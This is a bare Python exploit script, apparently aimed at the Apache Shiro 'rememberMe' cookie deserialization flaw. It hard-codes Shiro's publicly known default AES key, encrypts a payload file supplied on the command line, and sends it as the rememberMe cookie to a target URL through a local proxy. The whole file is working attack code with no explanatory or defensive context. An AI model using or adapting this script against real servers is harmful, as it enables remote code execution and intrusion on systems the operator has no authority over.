# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto import Random
from base64 import b64encode
from base64 import b64decode
import sys
import requests

BS = AES.block_size
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s: s[0:-ord(s[-1])]
key = b64decode('kPH+bIxk5D2deZiIxcaaaA==')


def encrypt(text):
    IV = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, IV=IV)
    data = b64encode(IV + cipher.encrypt(pad(text)))
    return data

proxies = {"http": "http://127.0.0.1:8080",}

url = sys.argv[1]

try:
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9',
    }
    data = open(sys.argv[2],'rb').read()
    encrypt_data = encrypt(data)
    response = requests.get(url, headers=headers, timeout=3, cookies={'rememberMe': encrypt(data)},
                                    allow_redirects=False, proxies=proxies)
except Exception as e:
	print(e)
